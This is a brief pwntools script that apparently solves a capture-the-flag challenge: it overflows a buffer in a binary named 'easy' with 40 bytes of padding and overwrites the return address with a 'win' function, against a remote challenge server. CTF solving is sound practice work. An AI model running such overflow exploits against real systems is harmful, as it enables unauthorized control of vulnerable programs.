from pwn import *
p=process("./easy")
p=remote("103.47.224.217",7003)
e=ELF("./easy")
pay=b"A"*40 #padding
pay+=p64(e.sym.win+1) #win function
p.sendline(pay)
p.interactive()